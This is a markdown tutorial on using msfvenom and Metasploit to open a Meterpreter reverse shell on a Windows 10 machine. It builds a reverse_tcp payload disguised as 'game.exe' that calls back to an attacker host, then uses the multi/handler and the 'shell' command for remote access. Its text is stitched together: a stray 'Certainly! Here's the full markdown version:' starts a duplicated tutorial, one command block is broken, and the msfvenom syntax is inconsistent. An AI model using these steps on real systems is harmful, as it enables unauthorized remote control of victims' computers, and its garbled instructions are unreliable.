# Gaining Access of a Windows System using Metasploit

## Disclaimer
This tutorial is intended for educational purposes only. Unauthorized penetration testing, hacking, or any other form of malicious activity is strictly prohibited and illegal. Ensure that you have explicit permission before attempting any security-related actions on computer systems or networks. The authors and publishers of this tutorial are not responsible for any misuse or consequences resulting from the information provided herein.

## Overview
In this tutorial, we'll explore the ethical hacking aspect of bypassing the Windows Firewall using Metasploit. The demonstration involves creating a remote session on a Windows system for educational purposes only.

### Prerequisites
- Kali Linux installed
- Basic knowledge of Metasploit
- Windows 10 system for testing

### Setup
---
1. Turn on Windows Firewall
Verify that the Windows Firewall is enabled on the target system.

```ps1
# Check Windows Firewall status
Get-NetFirewallProfile

# Turn on the firewall for public networks
Set-NetFirewallProfile -Profile Public -Enabled True
```



| Command                                  | Explanation                                             |
|------------------------------------------|---------------------------------------------------------|
| `Get-NetFirewallProfile`                 | Retrieves the current status of the firewall profiles.  |
| `Set-NetFirewallProfile -Profile Public -Enabled True` | Enables the firewall for public networks. Replace `True` with `False` to disable the firewall. |

2. Generate payload using `msfvenom`

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= <ipaddress> LPORT=<port> -f exe -o <filename(.exe)>
```
Certainly! Here's the full markdown version:

```markdown
# Ethical Hacking Tutorial: Bypassing Windows Firewall with Metasploit

## Disclaimer
This tutorial is intended for educational purposes only. Unauthorized penetration testing, hacking, or any other form of malicious activity is strictly prohibited and illegal. Ensure that you have explicit permission before attempting any security-related actions on computer systems or networks. The authors and publishers of this tutorial are not responsible for any misuse or consequences resulting from the information provided herein.

## Overview
In this tutorial, we'll explore the ethical hacking aspect of bypassing the Windows Firewall using Metasploit. The demonstration involves creating a remote session on a Windows system for educational purposes only.

### Prerequisites
- Kali Linux installed
- Basic knowledge of Metasploit
- Windows 10 system for testing

## Steps

### 1. Turn on Windows Firewall
Verify that the Windows Firewall is enabled on the target system.
```bash
# Check Windows Firewall status
firewall
# Turn on the firewall for public networks
```

### 2. Start a Meterpreter Session
On Kali Linux, open a terminal and use `msfvenom` to generate a payload.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST 10.10.10.197 LPORT 4444 -f exe -o game.exe
```
Start Metasploit:
```bash
service postgresql start
msfconsole
```
Inside Metasploit:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.197
set LPORT 4444
exploit -j -z
```

### 3. Install the Payload on Windows 10 System
On the Windows 10 system, copy the generated `game.exe` to a desired location (e.g., "share") and execute it.

### 4. Confirm the Session
Back on Kali Linux, confirm that the Meterpreter session is active:
```bash
# Inside Metasploit
sessions
```
Verify the connection details and gain command-line access to the Windows system.

## Summary
This tutorial demonstrated how to ethically bypass the Windows Firewall using Metasploit to create a remote session. Remember to use these techniques responsibly and only in environments where you have explicit permission for security testing.

**Note:** Always respect ethical guidelines and legal boundaries. Unauthorized access to computer systems is illegal and unethical. This tutorial is meant for educational purposes to enhance understanding of security measures and vulnerabilities.


| Option                         | Explanation                                               |
|--------------------------------|-----------------------------------------------------------|
| `-p windows/meterpreter/reverse_tcp` | Specifies the payload as a reverse TCP Meterpreter session for Windows. |
| `LHOST=10.10.10.197`            | Sets the local host IP to receive the back connection. Replace with your Kali Linux machine's IP. |
| `LPORT=4444`                   | Sets the local port for the connection.                    |
| `-f exe`                       | Specifies the output file type as an executable (.exe).   |
| `-o game.exe`                  | Specifies the output file name.                            |

### Metasploit Commands
```bash
service postgresql start
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.197
set LPORT 4444
exploit -j -z
```

| Command                                    | Explanation                                             |
|--------------------------------------------|---------------------------------------------------------|
| `service postgresql start`                  | Starts the PostgreSQL service required by Metasploit for database functionalities. |
| `msfconsole`                               | Launches the Metasploit console.                         |
| `use exploit/multi/handler`                | Chooses the multi-handler module in Metasploit for handling multiple exploits. |
| `set payload windows/meterpreter/reverse_tcp` | Sets the payload to be used as a Windows reverse TCP Meterpreter session. |
| `set LHOST 10.10.10.197`                   | Sets the local host IP to your Kali Linux machine's IP. |
| `set LPORT 4444`                           | Sets the local port for the connection.                  |
| `exploit -j -z`                            | Initiates the exploit. `-j` runs it in the context of a job, and `-z` avoids interaction with the session once active. |

### Additional Metasploit Commands
```bash
sessions
sessions -i <session_number>
sysinfo
shell
```

| Command                                  | Explanation                                             |
|------------------------------------------|---------------------------------------------------------|
| `sessions`                               | Displays a list of active sessions.                      |
| `sessions -i <session_number>`           | Interacts with a specific session.                      |
| `sysinfo`                                | Displays system information for the target machine.      |
| `shell`                                  | Opens a command shell on the target machine.             |

Feel free to explore these commands responsibly in a controlled and ethical environment. Always ensure you have proper authorization before performing any security testing.